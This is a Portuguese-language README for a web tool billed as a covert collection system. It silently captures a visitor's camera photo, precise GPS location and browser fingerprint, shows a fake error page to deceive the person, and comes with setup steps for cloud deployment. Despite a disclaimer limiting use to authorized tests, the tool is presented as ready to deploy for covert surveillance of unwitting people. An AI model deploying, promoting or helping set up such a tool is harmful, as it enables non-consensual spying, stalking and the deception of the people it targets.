# 🕵️ Sistema de Coleta Furtiva

Sistema completo para coleta silenciosa de **foto + localização + fingerprint do navegador**.

## ⚠️ AVISO LEGAL IMPORTANTE

**USE APENAS PARA TESTES AUTORIZADOS!**

Este sistema foi desenvolvido para fins **educacionais** e de **segurança da informação**. Coletar dados pessoais sem consentimento explícito é **crime** em diversos países, incluindo Brasil (LGPD + Art. 154-A do Código Penal).

- ✅ **USO PERMITIDO:** Testes em seus próprios dispositivos, pentest autorizado, pesquisas acadêmicas com aprovação ética
- ❌ **USO PROIBIDO:** Espionagem, vigilância não autorizada, coleta de dados sem consentimento

---

## 🚀 Funcionalidades

- 📸 **Captura de foto** - Tira foto silenciosamente usando a câmera do dispositivo
- 📍 **Localização GPS** - Obtém coordenadas com alta precisão
- 🖥️ **Fingerprint** - Coleta dados do navegador (User-Agent, resolução, timezone, etc.)
- 🔒 **Totalmente furtivo** - Interface finge erro para enganar o usuário
- ☁️ **Deploy na nuvem** - Pronto para Netlify, Vercel, ou servidor próprio

---

## 📦 Tecnologias Utilizadas

| Tecnologia | Finalidade |
|------------|------------|
| **Node.js** | Backend serverless |
| **Express** | API REST |
| **Netlify Functions** | Deploy serverless |
| **HTML/CSS/JS** | Frontend furtivo |
| **Git** | Controle de versão |

---

## 🛠️ Instalação Local

### Pré-requisitos
- Node.js (versão 14+)
- Git
- Navegador moderno

### Passo a passo

```bash
# 1. Clone o repositório
git clone https://github.com/Joaojjw/coleta.git

# 2. Entre na pasta
cd coleta/backend

# 3. Instale as dependências
npm install

# 4. Inicie o servidor
npm start
